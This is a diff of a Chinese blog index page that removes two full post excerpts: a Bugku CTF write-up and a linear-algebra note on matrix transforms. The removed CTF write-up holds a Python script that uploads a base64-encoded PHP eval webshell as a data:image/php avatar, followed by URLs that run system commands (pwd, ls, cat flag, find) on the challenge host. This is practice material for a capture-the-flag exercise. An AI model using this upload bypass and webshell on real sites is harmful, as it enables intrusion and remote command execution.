@@ -211,15 +211,14 @@
           <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>xxx二手交易市场<br>描　　述: 本人现实碰到的题目，无提示勿问<br>(这次题目比较牛逼，感觉实战性非常强。。。也挺有难度的)<br><img src="https://img-blog.csdnimg.cn/20210717224928197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaGFuZGVs,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h2 id="首先分析一波"><a href="#首先分析一波" class="headerlink" title="首先分析一波"></a>首先分析一波</h2><p>突然给我们这么一个网站，那就随便先点点看吧，看到id=的时候dna就动了感觉可能要注入，试了试发现不太行，决定先换个思路，再吸引到我的是注册<br><img src="https://img-blog.csdnimg.cn/2021071722515241.png" alt="在这里插入图片描述"></p>
 <p>注册并且登录之后可以打开个人中心<img src="https://img-blog.csdnimg.cn/20210717225402679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaGFuZGVs,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>思路来了，可能能通过图片一句话木马获得shell</strong></p>
-<h2 id="然后破解一波"><a href="#然后破解一波" class="headerlink" title="然后破解一波"></a>然后破解一波</h2><p>先随便上传一张图片抓个包<img src="https://img-blog.csdnimg.cn/20210717225857636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaGFuZGVs,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这就找到了<strong>提交表单的url：<a target="_blank" rel="noopener" href="http://114.67.246.176:17576/user/upload">http://114.67.246.176:17576/user/upload</a></strong><br>接着看到这一行<img src="https://img-blog.csdnimg.cn/20210717230148190.png" alt="在这里插入图片描述"><br>上传image文件的content-type可以是image/*</p>
-<h2 id="接着放一波技能"><a href="#接着放一波技能" class="headerlink" title="接着放一波技能"></a>接着放一波技能</h2><p><strong>我们就上传一个image/php方便我们获得shell</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:17576//user//upload&#x27;</span></span><br><span class="line">head=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;PHPSESSID=8e5042eb614c4fdb694a293e3355764e; Hm_lvt_c1b044f909411ac4213045f0478e96fc=1626231295; _ga=GA1.1.72381211.1626231295&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://114.67.246.176:17576/user&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">mydata=&#123;<span class="string">&#x27;image&#x27;</span>:<span class="string">&#x27;data:image/php;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7ID8+&#x27;</span>&#125;</span><br><span class="line">html=requests.post(url,headers=head,data=mydata).text</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;练习.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(html)</span><br></pre></td></tr></table></figure>
-<p><strong>这里获得一个html文件是为了获得返回的页面，也就是看是否文件上传成功</strong><br>post的内容是根据抓包得到的数据制定的，<strong>data:image/php;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7ID8+</strong> 后面这一部分是base64编码<br>解码后其实是帮我们获得shell的一句话木马：<?php @eval($_REQUEST['cmd']); ?></p>
-<p>上传成功就会得到这样的页面<img src="https://img-blog.csdnimg.cn/20210717231144284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaGFuZGVs,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面审查元素得到我们php文件的路径<img src="https://img-blog.csdnimg.cn/2021071723135357.png" alt="在这里插入图片描述"></p>
-<p>构造链接查看当前路径<br><a target="_blank" rel="noopener" href="http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27pwd%27)">http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27pwd%27)</a>;<br>得到：<img src="https://img-blog.csdnimg.cn/20210717231511447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xzaGFuZGVs,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>逐级跳转查看找flag<br><a target="_blank" rel="noopener" href="http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system">http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system</a>(%27cd ../;ls%27);</p>
-<p>第三个根目录的时候找到了flag<br><a target="_blank" rel="noopener" href="http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27cd%20../../../;cat%20flag%27)">http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27cd%20../../../;cat%20flag%27)</a>;</p>
-<p><img src="https://img-blog.csdnimg.cn/20210717231825787.png" alt="在这里插入图片描述"><br>或者直接<br><a target="_blank" rel="noopener" href="http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27find%20/%20-name%20flag%27)">http://114.67.246.176:17576//Uploads//heads//ac503144f38620a5.php?cmd=system(%27find%20/%20-name%20flag%27)</a>;<br><del>学不会了太难了</del> </p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/Bugku-xxx.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -286,18 +285,14 @@
           <h2 id="线代与计算机图形（一）"><a href="#线代与计算机图形（一）" class="headerlink" title="线代与计算机图形（一）"></a>线代与计算机图形（一）</h2><p><strong><del>现代很有趣我要转专业了米娜桑</del></strong><br>为什么是（一）呢，<del>因为后面我还没学</del> ，额，当然是因为不知道你们还想不想看这种类型的，这篇先讲讲<del>大家都喜欢的</del> 数学。</p>
 <p>本人大一学生，最近开始学习线代，老师告诉我们矩阵最开始是为了解决方程组问题产生的，但它神奇的成为计算机处理图形的十分有效的工具。对于矩阵的乘法有不同的理解方式，在这里我介绍和计算机图形相关的理解方法。</p>
 <h2 id="一、矩阵乘法的理解"><a href="#一、矩阵乘法的理解" class="headerlink" title="一、矩阵乘法的理解"></a>一、矩阵乘法的理解</h2><p><strong>左乘一个矩阵的实质是把右侧的向量映射到左乘的矩阵代表的坐标系中，本质上是一种坐标变换。</strong><br>看一个例子，一段python代码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a=np.array([[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">3</span>,<span class="number">4</span>]])</span><br><span class="line">b=np.array([[<span class="number">2</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">2</span>]])</span><br><span class="line"><span class="built_in">print</span>(np.matmul(b,a))//矩阵乘法  矩阵b*矩阵a </span><br></pre></td></tr></table></figure>
-<p>输出结果是<br><strong>[[2 4]<br> [6 8]]</strong><br> 我们通常把列数为一的矩阵叫做向量，这也就决定了我们的坐标变换是<strong>右乘一个矩阵</strong></p>
-<p> 其实右边的矩阵是列向量集，也就是需要变换的坐标的集合，所以我们可以看到本来坐标为（1，3）的向量通过坐标变换变成了（2，6），同样的（2，4）这个向量变成了（4，8）。变换的结果是我们意料之中的，因为我们<strong>左乘的矩阵是系数矩阵</strong>（单位矩阵乘上某个常数），所以坐标是<strong>成2倍的扩大。</strong></p>
-<p> 具体一点来看，这种变换<strong>实质就是基底的变换</strong>，比如（1，3）点基底选用的是i和j，i就对应着左乘矩阵的第一列，j就对应着左乘矩阵的第二列，也就是说左乘矩阵的第一行第二行分别对应着两个新的基底。</p>
-<p>左乘<strong>旋转矩阵</strong>更好帮我们理解，如下：<br><img src="https://img-blog.csdnimg.cn/20210420184746317.png#pic_center" alt="旋转矩阵"><br><strong>左乘着个矩阵相当于把向量以远点为圆心逆时针（因为人为规定这是正方向）旋转θ度</strong>。可以自己动手做做，多加思考一下就可以理解。</p>
-<h2 id="二、行列式的本质"><a href="#二、行列式的本质" class="headerlink" title="二、行列式的本质"></a>二、行列式的本质</h2><p>那么看到这里有好兄弟就会问了，我们做这样的变换岂不是也会改变原来<strong>向量的大小</strong>，那么改变的这个大小具体是多少呢。不管你有没有这样的疑问，我都要说明：</p>
-<p>其实<strong>左乘矩阵的行列式就是伸缩变换的扩大或者缩小的倍数</strong>，</p>
-<p>那么你又会说了如果不是方阵呢？如果左乘矩阵不是方阵就意味着我们的坐标系变换是变换了维度的，也就意味着这种变换是不可逆的，</p>
-<p><strong>所以非方阵是没有可逆矩阵的！！！</strong></p>
-<h2 id="三、关计算机啥事"><a href="#三、关计算机啥事" class="headerlink" title="三、关计算机啥事"></a>三、关计算机啥事</h2><p>说到这里那么这些关计算机什么事呢……</p>
-<p>计算机的3维绘图中常常要用到矩阵变换，比如局部坐标系左乘平移矩阵变为世界坐标系，左乘旋转矩阵可以绕着某一轴旋转，还有正视投影矩阵、透视投影矩阵等等。以后有机会再写吧，<del>毕竟日语专业的学生首要任务是学日语</del> 。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/linear%20algebra.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
